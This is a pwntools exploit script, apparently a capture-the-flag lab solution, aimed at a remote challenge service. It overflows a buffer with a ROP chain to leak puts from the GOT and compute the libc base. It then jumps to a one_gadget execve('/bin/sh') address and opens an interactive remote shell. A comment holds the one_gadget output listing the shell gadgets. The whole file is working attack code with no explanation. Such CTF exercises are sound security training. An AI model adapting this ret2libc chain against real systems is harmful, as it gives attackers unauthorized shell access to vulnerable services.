from pwn import *
import binascii
context.arch = 'amd64'

r = remote('csie.ctf.tw','10127')
puts_GOT_memory = p64(0x601018)
pop_rdi = p64(0x400673)
puts_addr = p64(0x4004a0)
main_addr = p64(0x4005b7)
payload = b'a'*16
r.send(payload + pop_rdi + puts_GOT_memory + puts_addr + main_addr + b'\n')
_ = r.recvuntil('\n')
puts_GOT_value = u64(r.recvuntil('\n').strip().ljust(8,b'\x00'))
puts_libc = 0x809c0
libc_base = puts_GOT_value - puts_libc
print(hex(libc_base))
'''
arvin@lab4$ one_gadget lab4-3.so.6
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
one_gadget = p64(libc_base + 0x10a38c )
r.send(payload + one_gadget+ b'\n')
r.recvuntil('\n')
r.interactive()